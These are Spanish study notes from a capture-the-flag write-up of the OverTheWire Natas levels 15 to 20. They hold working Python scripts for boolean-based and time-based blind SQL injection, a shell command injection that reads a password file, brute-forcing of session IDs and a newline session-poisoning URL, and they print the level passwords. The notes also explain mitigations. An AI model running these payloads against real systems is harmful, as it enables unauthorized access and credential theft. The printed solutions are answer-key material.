- Este ejercicio nos plantea un tipo de ataque: **Blind SQL Injection (Boolean-based)**. Vamos a ver el codigo como trabaja

![[Captura de pantalla 2026-01-03 230158.png]]

- Este código nos plantea que podemos probar si un usuario es valido o no, entonces vamos por la contraseña. Como ya estamos en la base de datos podemos ir directamente con **and** y averiguar sobre la contraseña 

```
natas16" AND password LIKE BINARY "a%
```

     Explicacion de el script
     
    LIKE -> compara una cadena con un patrón y devuelve TRUE o FALSE
    Toma el valor real de una columna (ej. password), Toma **un patrón**  (ej.`"a%"`)
    
      %  -> “toma” o “acepta” el resto de los caracteres si los hay.
      
      BINARY -> hace que la búsqueda sea sensible a mayúsculas y minúsculas

- Este ejercicio nos plantea algo clave, ya que como mencionamos anteriormente la pagina nos da la forma de verificar si un usuario existe o no y como es lógico que natas16 existe podemos usarlo como **ancla** en la solicitud para indirectamente preguntarle por la contraseña y la expresión de esto es el script indirectamente  

     Sin embargo el hecho de tener que probar este script digito por digito sabiendo que la contraseña tiene 32 dígitos nos hace la tarea muy larga y perderíamos mucho tiempo por lo que mas optimo es crear con python un script mas completo para automatizar la tarea


- Este es nuestro script:

```
import requests
from requests.auth import HTTPBasicAuth
import string

# Configuración del objetivo
target_url = "http://natas15.natas.labs.overthewire.org/"
auth = HTTPBasicAuth('natas15', 'TTGAYUA9uREpq6STvql649DrBAs6SsnS')

# Definimos el set de caracteres: letras minúsculas, mayúsculas y números
charset = string.ascii_letters + string.digits
password = ""

print("--- Iniciando extracción de contraseña ---")

# Las contraseñas de Natas suelen tener 32 caracteres
for i in range(32):
    for char in charset:
        # La clave es el "LIKE BINARY" para distinguir mayúsculas de minúsculas
        # El "%" es el comodín que significa "cualquier cosa después de esto"
        payload = f'natas16" AND password LIKE BINARY "{password + char}%'
        
        try:
            response = requests.post(target_url, auth=auth, data={'username': payload})
            
            # Si el servidor responde que el usuario existe, encontramos el carácter correcto
            if "This user exists" in response.text:
                password += char
                print(f"[+] Carácter {i+1} encontrado: {char} -> {password}")
                break
        except Exception as e:
            print(f"Error en la conexión: {e}")

print(f"\n[!] Extracción completa. Contraseña: {password}")

```

- Vamos a entender esas partes que no entendemos (ya que con portswiger hicimos uno igual pero este requiere unos pequeños datos)

     ¿Qué es `HTTPBasicAuth`?
     Es una clase de la librería `requests` que facilita el envío de credenciales (usuario y contraseña) siguiendo el protocolo de **Autenticación Básica de HTTP**.
     
     Cuando entras a cualquier nivel de Natas (como `natas15.natas.labs.overthewire.org`), el navegador te muestra una ventanita emergente pidiéndote usuario y contraseña. Eso no es un formulario HTML común, es el servidor pidiendo una **cabecera de autorización**.
     
        Originalmente yo pense en usar auth = ('usuario', 'pass') pero haciendo 
        esto confías en que la librería `requests` adivine qué quieres hacer por si         sola . Pero, ¿qué pasa si el servidor usa otro tipo de   autenticación? Al          importar   `HTTPBasicAuth`, tú tienes el control total. Sabes exactamente   qué protocolo estás  hablando con el servidor.
             Este método envía las credenciales en la cabecera `Authorization`  codificadas en **Base64**


     ## Try
     En **Python**, la sentencia `try` se usa para **manejar errores (excepciones)** y evitar que el programa se detenga abruptamente cuando ocurre un problema.

```
try:
    # Intenta convertir la entrada en un número entero
    numero = int(input("Dime un número: "))
    print(f"Perfecto, el {numero} es un gran número.")
    
except ValueError:
    # Esto solo se ejecuta si el usuario escribió letras
    print("Oye, eso no es un número. ¡Escribe solo dígitos!")

print("El programa continúa ejecutándose gracias al try-except.")
```

 

![[Captura de pantalla 2026-01-03 225546.png]]

```
hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```

## Aplicación en la vida real 

- Este ejercicio nos ensena a identificar bases de datos sin sanitización sin filtros como `prepare()` y `bind_param()` o el uso de puntos (.) para pegar es muy basico y vulnerable

_________________

# Level 16

- Este ejercicio nos plantea una **Blind Injection** pero no en una base de datos sino en puro **php** ademas de otros conceptos muy pero muy importantes que tenemos que comprender muy bien. Vamos a entender el codigo fuente:

![[Captura de pantalla 2026-01-05 034221.png]]

#capasdeunapaginaweb

- Este ejercicio nos ensena que los siguientes caracteres están bloqueados por lo que tenemos que ser creativos para ejecutar código. En mi caso yo investigue opciones diferentes y poco usadas para ejecutar comandos en **php** en pro de evitar los caracteres bloqueados pero no encontré ninguna opción. Aquí llego un concepto muy importante que cambio mi forma de entender este problema (y la ciberseguridad en general )y la forma como definí este concepto es ***capas de una pagina web***

    La importancia de este concepto radica en cómo trabaja el **PHP** (capa 2) con la **SHELL** (capa 4) y el papel del programador en ello. Para empezar, hay que entender que los programadores, sabiendo los límites que tiene **PHP**, le dan tareas a la **SHELL** que normalmente serían de **PHP**, y entre estas tareas está la ejecución de comandos, lo que es bastante peligroso si no se **sanitiza** bien. Para el ejemplo tomemos este ejercicio, ya que en este caso Natas usa **_passthru()_**, el cual es muy peligroso porque ejecuta comandos directamente.
    
    Esto también nos lleva a entender algo igual de importante: identificar qué herramienta se está usando para tomar los datos (el **input**) y cómo viaja la información entre capas. En el código vemos que se usa **grep** dentro del **PHP**, lo que parece inofensivo; pero si prestamos atención a este detalle y lo enfrentamos con la relación entre la capa 1 y 2, nos damos cuenta de que aquí el programador dejó una falla de seguridad grandísima al establecer un vínculo crítico sin **validación** ni protección.

- En base a lo anterior deducimos que no necesitamos formas poco comunes para ejecutar **php**, podemos usar **bash** (SHELL) ya que tenemos acceso directo a la **SHELL** (capa 4) entonces vamos a usar lo siguiente **$()**

```
$(grep ^a /etc/natas_webpass/natas17)
```

     ^ significa  "al principio de la línea"). 

- Este nos va a funcionar pero tenemos que aprovecharnos de la función principal de la pagina para usarla como **ancla** y aparte usarla como tipo de **indicador** si lo hacemos bien o mal. Veamos:

![[Captura de pantalla 2026-01-05 051457.png]]


- Entonces ponemos **Sunday** como **ancla** para que corra la pagina y luego esta nuestra inyección que se hace con **grep** para buscar el primer digito de la contraseña y que pasa, si la pagina nos devuelve resultado para **Sunday** es por que la contraseña no empieza por la letra que probamos pero si no nos devuelve nada es por que la letra que probamos si hace parte de la contraseña.

     Entonces viendo esto funciona es nuestro deber automatizar este **verificador** por que si lo hacemos letra por letra nos va a tomar mucho tiempo 

- Nuestro script:

```
import requests
from requests.auth import HTTPBasicAuth
import string

# Configuración del objetivo
target_url = "http://natas16.natas.labs.overthewire.org/"
auth = HTTPBasicAuth('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')

# Definimos el set de caracteres: letras minúsculas, mayúsculas y números
charset = string.ascii_letters + string.digits
password = ""

print("--- Iniciando extracción de contraseña ---")

# Las contraseñas de Natas suelen tener 32 caracteres
for i in range(32):
    for char in charset:
        payload = f'Sunday$(grep ^{password + char} /etc/natas_webpass/natas17)'
        
        try:
            response = requests.get(target_url, auth=auth, params={'needle': payload})
            
              
            if "Sunday" not in response.text:
                password += char
                print(f"[+] Carácter {i+1} encontrado: {char} -> {password}")
                break
        except Exception as e:
            print(f"Error en la conexión: {e}")

print(f"\n[!] Extracción completa. Contraseña: {password}")

```

## Solución 

```
EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```

 
 **Conceptos importantes de el script**
 
 - 🧩 Diferencia Técnica: params vs data

| Término | Se usa con... | ¿Dónde pone los datos? | El **PORQUÉ** técnico |
| :--- | :--- | :--- | :--- |
| **`params`** | `requests.get` | Al final de la **URL** | El protocolo HTTP define que la **identidad** de una consulta (GET) debe ser visible en la dirección. |
| **`data`** | `requests.post` | Dentro del **Cuerpo** | El protocolo HTTP define que el **contenido** a procesar (POST) debe viajar dentro del paquete, no en la dirección. |

> [!TIP] Regla de Oro para Natas
> - Si el código PHP usa **`$_GET`** ➔ Python usa `params`.
> - Si el código PHP usa **`$_POST`** ➔ Python usa `data`.

- En nuestro script  **grep** es quien se encarga de diferenciar entre min y MAY (cumple la misma función de BINARY con SQL)

## Aplicación en la vida real 

Todo lo que aprendí en este ejercicio no se queda solo en un reto de CTF; es exactamente como se rompen sistemas reales hoy en día.

### 1. El Peligro de las "Funciones Puente"
En el mundo real, los programadores usan funciones como `passthru()`, `system()` o `exec()` para ahorrar tiempo (por ejemplo, para comprimir un archivo con `zip` o procesar una imagen). 
- **Lección:** Cada vez que una aplicación "salta" de su lenguaje (PHP, Python, Node) a la Shell del sistema, se abre una grieta. Si no hay una **sanitización** radical, esa grieta es una entrada total al servidor.

### 2. La Falacia de la Invisibilidad (Blind Attacks)
Muchos desarrolladores creen que si la página no muestra errores de código o resultados directos del sistema, están seguros.
- **Lección:** Mi script de Python demostró que **no necesito ver el resultado para robar la información**. Si puedo generar una diferencia (como que aparezca o desaparezca una palabra ancla), puedo extraer bases de datos y contraseñas completas letra por letra.

### 3. Confianza Ciega en el Input
El error más común en la vida real es confiar en que el usuario enviará lo que se le pide.
- **Lección:** Nunca se debe concatenar una variable del usuario directamente en un comando o consulta. La aplicación debe tratar todo input como **hostil** por defecto.

### 4. Diferencia de "Buzones" (params vs data)
Saber si la info viaja por la URL o por el Cuerpo es vital para una auditoría. 
- **Lección:** Muchos ataques fallan no porque el payload sea malo, sino porque el atacante le está hablando al "buzón" equivocado (enviando `data` cuando el servidor espera `params`).

____________
# Natas 17

 - En este ejercicio volvemos a tocar bases de datos, y de hecho tiene el mismo código que el ***Level 14-15*** pero tiene una excepción muy importante y es el factor de que al rectificar si un usuario existe o no, en el código esta comentado las respuestas! lo que nos complica por que no habrá forma de darnos cuenta si un usuario es correcto o no.

![[Captura de pantalla 2026-01-06 045945.png]]

- Primeramente intente correr **SELECT SLEEP(10)** para usar el **factor** tiempo para darme cuenta si una solicitud es correcta o no, pero no funciono. 

     El enfoque al que me costo llegar es entender el concepto de **ancla** que ya he tocado anteriormente pero esta vez no supe adaptar el concepto a este ejercicio. Y el concepto es aprovechar el hecho de que se que **natas18** existe para usarlo como **ancla** e introducirle ahora un **timer** para rectificar si cada digito de la contraseña es correcto 

- Revisemos el script que nos va a funcionar:

```
natas18" AND IF(BINARY SUBSTRING(password, {1, 1) = "a", SLEEP(7), 0)#
```

*En **SQL**, la función `LEFT()` se utiliza para **extraer un número específico de caracteres desde el inicio (lado izquierdo) de una cadena de texto***

- Este script nos dice que si la letra **a** es la primera letra de la contraseña entonces se va a demorar 10seg pero si no lo es se demorara 0seg

    Ahora debemos automatizar esta tarea para toda la contraseña y no ir letra por letra. Vamos a diseñar un script 

```
import requests
import string
import time
from requests.auth import HTTPBasicAuth

# --- CONFIGURACIÓN DEL OBJETIVO y CONFIGURAR AUTENTICACION ---

url = 'http://natas17.natas.labs.overthewire.org/'
auth = HTTPBasicAuth("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")

# --- Mezclamos el charset. Las claves de Natas suelen ser alfanuméricas (A-Z, a-z, 0-9)


charset = string.ascii_letters + string.digits
password = ""

print("[+] Iniciando Blind SQL Injection de ALTA PRECISIÓN...")
print("[+] Objetivo: Extraer contraseña de natas18")
print("-" * 50)


for i in range(1, 33):
    found_char = False
    
    for char in charset:
        # --- Usamos BINARY para diferenciar mayúsculas de minúsculas
        # --- SLEEP(7) nos da un margen muy alto contra el lag de red normal
        
        #********************* PAYLOAD *********************************
        payload = f'natas18" AND IF(BINARY SUBSTRING(password, {i}, 1) = "{char}", SLEEP(7), 0)#'
        
        try:
            # --- Primera petición: El "sondeo" Medimos la primera solicitud
            
            start_time = time.time()
            response = requests.post(url, auth=auth, data={"username": payload}, timeout=20)
            
            # --- Usamos elapsed para mayor precisión del servidor
            
            duration = response.elapsed.total_seconds()
            
            # !!!!!!!!!!!!!!!! PRIMERA CONFIRMACION !!!!!!!!!!!!!!!!!!!!!!!
            if duration >= 6.5:
                # --- FASE DE DOBLE VERIFICACIÓN ---
                # --- Si detectamos un posible acierto, esperamos un poco y preguntamos de nuevo
                print(f"[*] ¿Es la '{char}'? (Tardó {duration:.2f}s). Verificando...")
                time.sleep(1) # Pausa de estabilidad
                
                
                
                confirm = requests.post(url, auth=auth, data={"username": payload}, timeout=20)
                confirm_duration = confirm.elapsed.total_seconds()
                
                # !!!!!!!!!!!!SEGUNDA CONFIRMACION!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
                if confirm_duration >= 6.5:
                    # Si ambos intentos superan el umbral, la letra es CORRECTA y entonces se agrega a password
                    password += char
                    print(f"[!] POSICIÓN {i} CONFIRMADA: {char} -> {password}")
                    found_char = True
                    break
                else:
                    # Si la segunda fue rápida, era lag. Seguimos buscando en el charset.
                    print(f"[?] Falso positivo con '{char}' (Confirmación tardó {confirm_duration:.2f}s)")
            
        except requests.exceptions.RequestException:
            # Si hay un error de conexión, esperamos y reintentamos la misma letra
            print(f"[!] Error de conexión en '{char}'. Reintentando en 2 segundos...")
            time.sleep(2)
            continue

    if not found_char:
        print(f"\n[X] Error: No se pudo encontrar el carácter para la posición {i}.")
        print(f"Contraseña parcial obtenida: {password}")
        break

print("-" * 50)
print(f"[✔] PROCESO FINALIZADO")
print(f"[✔] La contraseña real de natas18 es: {password}")
```

- Este script tomo mucho tiempo y tiene un flujo el cual es importante entender vamos a ir parte por parte:

- **Capa 1 (Posiciones):** Se cargan dos tareas principales. Primero, se establece un valor inicial negativo (`found_char = False`). Segundo, se deja programada la función de control (`if not found_char`) para el final del proceso.
    
- **Capa 2 (Letras):** Se ejecutan los filtros de búsqueda. Si la letra es correcta, el valor negativo se transforma en positivo (`found_char = True`) y se ejecuta un `break` que destruye esta segunda capa.
    
- **Interacción y Cierre:** Al romperse la capa de letras, el programa regresa a la tarea pendiente de la Capa 1 (`if not found_char`). El código utiliza el valor actual de la variable:
    
    - **Si es positivo (`True`):** Se evita el cierre del programa, permitiendo que se pase a buscar una nueva letra.
        
    - **Si es negativo (`False`):** Se interpreta que el bucle terminó con todas las letras sin éxito, cumpliéndose la condición de que no hay más caracteres y finalizando la ejecución.




    **except requests.exceptions.RequestException:** nos dice basicamente que si hay un problema de conexión, lo intentamos otra vez y así hasta que funciones

![[Captura de pantalla 2026-01-06 210745.png]]

## Solución 

```
6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```

## Aplicación en la vida real 

Este ejercicio plantea un **ataque de temporización (Timing Attack)**, un tipo de **Blind SQL Injection**. Aunque el sistema no muestra los datos directamente, se utiliza el tiempo de respuesta del servidor como un canal para confirmar si una solicitud fue exitosa. Al medir estas variaciones, es posible extraer la contraseña carácter por carácter mediante inferencia lógica.

Otro concepto importante que comprendí mientras resolvía este ejercicio fue que no podía esperar un retraso “perfecto” de 5 segundos para confirmar si una condición era verdadera. En Natas 17, el tiempo se convierte en una señal indirecta y poco precisa, ya que cada petición se ve afectada por la red, el servidor y el propio navegador, algo que ocurre constantemente en la vida real. Entender esto fue un punto de inflexión: dejé de buscar tiempos exactos y empecé a comparar comportamientos. Si la página tardaba claramente más de lo normal, la condición se cumplía. Este cambio de enfoque fue clave, ya que entender que el tiempo de procesamiento de una página web puede verse afectado por muchos factores me ayudó a comprender cómo funcionan realmente los ataques basados en tiempo fuera de un entorno controlado.


## Frases claves

> Como pentester, no calculo tiempos exactos; identifico rangos de tiempo que rompen el comportamiento normal del sistema y se repiten de forma consistente.

> Un ataque basado en tiempo consiste en provocar una condición que haga que el sistema se comporte de forma poco común y observar si la respuesta tarda significativamente más de lo normal.

> No mido tiempo exacto; observo si la respuesta rompe el comportamiento normal del sistema.

______________________________

# Natas 18

- Este ejercicio nos plantea el escenario donde trabajamos con **cookies** y mas importante aun con **$_SESSION**  (sesiones en general), veamos el codigo fuente:

![[Pasted image 20260111145434.png]]

![[Captura de pantalla 2026-01-11 145752.png]]

- En esta primera parte de el código identificamos tres funciones, vamos una por una:


```
`function isValidID($id) { /* {{{ */    return is_numeric($id);`
```

      verifica si id es un valor numerico, y si lo es da un true 


```
function createID($user) {
    global $maxid;
    return rand(1, $maxid);
}
```

     En esta funcion no se usa $user realmente, nos tenemos que centrar en $maxid,  ya que este establece un numero random entre 1 y 640 (el valor de maxid que se establablece al principio)

- **`global $maxid;`** Esto permite acceder a la variable `$maxid` que está definida **fuera** de la función (en el ámbito global). Es decir, la función usa el valor de `$maxid` que existe en otro lugar del código.
- La función `createID` **genera un ID aleatorio** entre 1 y el valor máximo definido en `$maxid`. El parámetro `$user` no se usa dentro de la función, lo que sugiere que podría estar ahí para futuras ampliaciones o por error.

```
function debug($msg) {
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
```

- **`array_key_exists("debug", $_GET)`** Comprueba si existe un parámetro llamado **"debug"** en la URL (es decir, en la superglobal `$_GET` de PHP). Por ejemplo, si la URL es `pagina.php?debug=1`, esta condición será `true`.
- **`print "DEBUG: $msg<br>";`** Si el parámetro "debug" existe en la URL, imprime el mensaje `$msg` en la página web, precedido por "DEBUG: " y seguido de un salto de línea HTML (`<br>`).




- Entendiendo esto vamos a continuar la siguiente parte de el codigo donde estan las dos funciones claves.

     La primera función nos ayuda a entender si una sesión esta conectada o no, pero ese **else** en especial nos ayuda a identificar si la palabra **admin** esta o no dentro de la sesión, lo que mas adelante va a tener mucho sentido



     La segunda función es la que nos muestra la contraseña si cumplimos el **if** como ahí se requiere 

```
if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1
```

    “Primero revisa que `admin` exista en la sesión y luego verifica que su valor sea `1`.”

- Por eso mencione anteriormente que es importante saber si "admin" esta o no dentro de la sesión vigente.






- Para complementar esta información vamos a entender como funciona **$_SESSION** ya que es es clave en este ejercicio  


- **Que es SESSION??**

    - Es un array asociativo donde la página **guarda información del usuario entre peticiones**.
    - Por ejemplo, `$_SESSION["admin"]` es el flag que indica privilegio.
    - También puede tener otras claves como `username` u `id`.



- **Cuando haces un request a la página:**

    - PHP revisa tu PHPSESSID
    - Si existe, carga `$_SESSION` correspondiente
    - Si no, crea una sesión nueva

- La página **lee y, si hace falta, inicializa valores** (por ejemplo `admin = 0`)
    
- La página **decide qué mostrar** en base a los valores de la sesión:
    
    - `admin == 1` → credenciales
    - `admin == 0` → mensaje de usuario regular

- Cada request depende **de que la sesión se mantenga consistente**.

    - Si cambias el PHPSESSID, estás viendo otra sesión → otra copia del estado → otra evaluación del `if`.





- Teniendo en cuenta toda esta información inferimos que cambiando el **PHPSESSID** podemos llegar hasta la sesión correcta donde nos darán la contraseña, entonces tenemos que hacer un script que vaya de 1 a 640 probando hasta que nos de la sesión correcta 

```  
import requests
from requests.auth import HTTPBasicAuth

url = "http://natas18.natas.labs.overthewire.org/"
username = "natas18"
password = "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"

print("inicio de ataque")

for i in range(1, 641):
    cookies = {"PHPSESSID": str(i)}
    response = requests.get(
        url,
        auth=HTTPBasicAuth(username, password),
        cookies=cookies
    )
    print(f"probando con {i}")

    if "You are an admin" in response.text:
        print(f"¡Encontrado! PHPSESSID = {i}")
        print(response.text)
        break

```


 
![[Captura de pantalla 2026-01-11 154336.png]]

     Y si probamos con el 119 en el ** **

![[Pasted image 20260111154702.png]]

     Tenemos la contrasena! 

```
tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
```

## Aplicación en la vida real y mitigación

La vulnerabilidad se origina porque la aplicación utiliza **identificadores de sesión predecibles y de baja probabilidad (`PHPSESSID` entre 1 y 640) y **confía exclusivamente en el estado almacenado en la sesión (`$_SESSION["admin"]`) para la autorización**, sin realizar ninguna validación adicional que vincule la sesión con el usuario autenticado. aprovechandose de vulnerabilidades como:

- **Broken Authentication**
- **Broken Session Management**
- **Privilege Escalation**

```
Un atacante no necesita explotar vulnerabilidades complejas; basta con **enumerar o predecir los identificadores de sesión**.
```

     Este ejercicio demuestra que **una mala gestión de sesiones puede comprometer  completamente la seguridad de una aplicación**, incluso cuando no existen vulnerabilidades tradicionales como SQL Injection o XSS.



**Mitigaciones**

Para prevenir este tipo de vulnerabilidades, los identificadores de sesión deben generarse de forma criptográficamente segura y no ser predecibles ni enumerables. Además, el ID de sesión debe regenerarse al iniciar sesión o al cambiar privilegios, y las decisiones de autorización críticas no deben depender únicamente del estado almacenado en la sesión (`$_SESSION`), sino validarse correctamente.

_________________

# Level 19 

-  Este ejercicio nos plantea el mismo código fuente que el nivel anterior pero con un pequeño cambio y es que el servidor espera el identificador de sesión codificado en HEX, lo cual no añade seguridad real. 

![[Captura de pantalla 2026-01-11 230443.png]]

![[Captura de pantalla 2026-01-11 165105.png]]

     Esto nos dice que ya no solo vale hacer un script con un bucle yendo de 1 a 640, eso ya no serviria, hay que tener en cuenta el HEX.

- Como en el ejercicio anterior determinamos que el vector de ataque era la cookie vamos a reutilizar el script de el nivel anterior solo adaptando unas cosas

```
import requests
from requests.auth import HTTPBasicAuth

url = "http://natas19.natas.labs.overthewire.org/"
username = "natas19"
password = "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"

print("Inicio de ataque")

for i in range(1, 641):
    payload = f"{i}-admin"
    encriptado = payload.encode().hex()
    cookies = {"PHPSESSID": encriptado}
    response = requests.post(
        url,
        auth=HTTPBasicAuth(username, password),
        cookies=cookies
    )

    print(f"Probando con {payload}")

    if "You are an admin" in response.text:
        print(f"¡Encontrado! PHPSESSID = {i}")
        print(response.text)
        break

```

- El script funciona y nos da el siguiente resultado:

![[Captura de pantalla 2026-01-12 151429 1.png]]

- Ahora vamos a convertirlo a HEX con el siguiente script

```
valor = "281-admin"
encriptado = valor.encode().hex()
print(encriptado)
```


- Nos da el siguiente resultado:

![[Captura de pantalla 2026-01-12 151537 1.png]]

```
3238312d61646d696e
```

- Ahora tenemos que ingresar ese valor en la cookie y probar si si funciona

![[Captura de pantalla 2026-01-12 150626.png]]

     Y funciona!!!

### Contraseña:

```
p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
```

## Aplicación en la vida real:

Este ejercicio como el anterior (son casi idénticos) nos presenta una **identificación de sesiones** muy vulnerable y accesible, ya que **confía solamente en el PHPSESSID ciegamente para dar privilegios**, no hay ningún tipo de validación mas que un **HEX** (que se rompe facilmente) que presente una real defensa aprovechándose de vulnerabilidades  como:

- **Broken Authentication**
- **Broken Session Management**
- **Privilege Escalation**


```
Un atacante no necesita explotar vulnerabilidades complejas; basta con **enumerar o predecir los identificadores de sesión**.
```

     Este ejercicio demuestra que **una mala gestión de sesiones puede comprometer  completamente la seguridad de una aplicación**, incluso cuando no existen vulnerabilidades tradicionales como SQL Injection o XSS.

__________________

# Level 20

- Este ejercicio nos plantea un escenario mas real y semejante a la vida real donde no hay pistas, ni payloads evidentes que nos muestren donde esta el error. este ejercicio nos lleva a tener una comprensión mas grande de el código fuente a entender como el mismo procesa esa información y ver con ojo clínico esos pequeños detalles que en realidad desencadenan cosas muy grandes. veamos el código:

![[Pasted image 20260113210954.png]]

![[Captura de pantalla 2026-01-13 211634.png]]

![[Captura de pantalla 2026-01-13 211757.png]]

      Resalte ciertas partes que son las partes mas importantes e ire explicando parte por parte 

- Primero me gustaría empezar con mis primeras impresiones y deducciones de este nivel. 

     Lo primero que me di cuenta es que el **PHPSESSID** tiene siempre 26 caracteres. luego me di cuenta que el vestor de ataque esta en **`$_SESSION["name"] = $_REQUEST["name"];`** lo que me permite tener acceso a la **$_SESSION** desde el input de la pagina


### Puntos importantes:

- Este ejercicio nos lleva a tener conceptos importantes como

     1 - *Como funcionan las sesiones (**$_SESSION**) en general*
         Esto es fundamental, entender como se estructuran las sesiones, como se crean, sus componentes, como se relacionan entre si.
           [[https://code.tutsplus.com/es/how-to-use-sessions-and-session-variables-in-php--cms-31839t]]
          
        
     2 - *serialización en php*
         Esto de la serialización es critico entenderlo para complementar las sesiones ya que ayuda a manejar la información de forma organizada. Es importante entender que la serialización es algo de uso actual lo que tendrá sentido mas adelante.
         https://www.php.net/manual/es/function.serialize.php


- Continuando con el proceso de resolución vamos a recalcar algo a la que no le preste atención inicialmente por que parecía "ruido", grave error. fue la clave para la solución.

     Anteriormente mencionamos que la serialización es clave para ver como se organiza la información, pero para este ejercicio no se aplico tal '**método**' sino que el propio ejercicio usa su método para procesar la información. Este script hace que la información quede con un formato   " 'clave'espacio'valor' " lo que va a ser esencial. Veamos por que.

-  Teniendo en cuenta que nuestro vector de ataque es el input de la pagina web el cual se interpretara en la **$_SESSION**

```
`$_SESSION["name"] = $_REQUEST["name"];`
```

     Tenemos que juntar este vectr con la forma como el script manipula la informacion (la cual mencionamos anteiormente).

- Paso a paso

     Primero tenemos que tener nuestro propio, vamos a modificar el **PHPSESSID** con otro (previamente se probo que cambiándolo por un string de 26 caracteres la pagina lo acepta como valido)

     Segundo vamos a hacer una sesión nueva, vamos a mandar el valor **foo**
     (para comprobar que este creado vamos a mandar un **?debug=** solo y esto nos tiene que devolver nuestro nuevo **PHPSESSID** y la sesión **foo**

     Tercero vamos a ingresar una nueva sesión (que en realidad es nuestro exploit), va a tener el siguiente formato:

         http://natas20.natas.labs.overthewire.org/?name=foo%0Aadmin%201
          
         %0A representa \n
         %20 es un espacio

     Entonces el script pide un name, vamos a usar **foo** que ya esta creado, luego vamos a poner 'admin 1' y por que esto funcionaria? el formato de la pagina para recibir informacion es  'clave'espacio'valor' entonces es como si le pasáramos dos claves entonces si mandamos 'foo Admin 1' 

        Primero se va a actualizar la clave 'name' con el valor foo
         Segundo nuestro input 'admin' va a ser tomado como la seguunda clave (que es donde se cumple el if de print_credentials() ) y su valor seria 1 lo que acaba de confirmar el if. con esta informacion ya en la $_SESSION de la pagina solo recargamos la pagina y como ya se cumplio el print_credentials() nos deberia de mostrar la informacion.

![[Captura de pantalla 2026-01-13 221726.png]]
     En amarillo vemos la confirmación de la **sesión** y de el **PHPSESSID**

```
BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
```

# Apliación en la vida real

Este nivel explota una vulnerabilidad de **Session Poisoning**, producida por un manejo deficiente de las sesiones, que carece de mecanismos adecuados de **validación e integridad del estado**.

La vulnerabilidad surge debido a una implementación personalizada del manejo de sesiones, donde la información de estado se persiste en un formato controlable y puede ser influenciada directamente por el input del usuario.

Cuando el estado de sesión puede ser modificado de esta forma, el atacante es capaz de **inyectar nuevos valores de estado** que alteran la lógica de la aplicación, lo que puede derivar en **escaladas de privilegios sin necesidad de ejecutar código**.

_________________________________













